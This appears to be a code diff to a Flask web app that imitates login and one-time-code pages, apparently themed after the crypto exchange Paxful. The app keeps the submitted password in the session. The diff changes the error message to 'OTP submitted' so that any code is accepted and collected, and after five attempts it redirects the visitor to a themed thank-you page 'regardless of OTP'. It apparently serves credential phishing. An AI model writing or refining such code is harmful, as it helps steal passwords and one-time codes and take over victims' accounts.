@@ -163,19 +163,23 @@ def otp_page():
             platform=session['theme']
         )
 
+        # After 5 attempts (or on the 5th), redirect to thank you page regardless of OTP
         if session['otp_attempts'] >= 5:
+            action = session.get('action', 'make')
+            theme = session.get('theme', 'paxful')
             session.pop('otp_attempts', None)
             session.pop('password', None)
-            session.pop('action', None)
-            random_sites = [
-                'https://www.example.com', 'https://www.google.com',
-                'https://www.wikipedia.org', 'https://www.reddit.com', 'https://www.bing.com'
-            ]
-            return redirect(random.choice(random_sites))
+            return redirect(url_for('thank_you', action=action, theme=theme))
         else:
-            message = f"Incorrect OTP. Attempts left: {5 - session['otp_attempts']}"
+            message = f"OTP submitted. Attempts left: {5 - session['otp_attempts']}"
 
     return render_template('verify_otp.html', theme=session['theme'], message=message)
+
+@app.route('/thank-you')
+def thank_you():
+    action = request.args.get('action', 'make')
+    theme = request.args.get('theme', 'paxful')
+    return render_template('thank_you.html', action=action, theme=theme)
 
 @app.route('/login', methods=['POST'])
 def login():
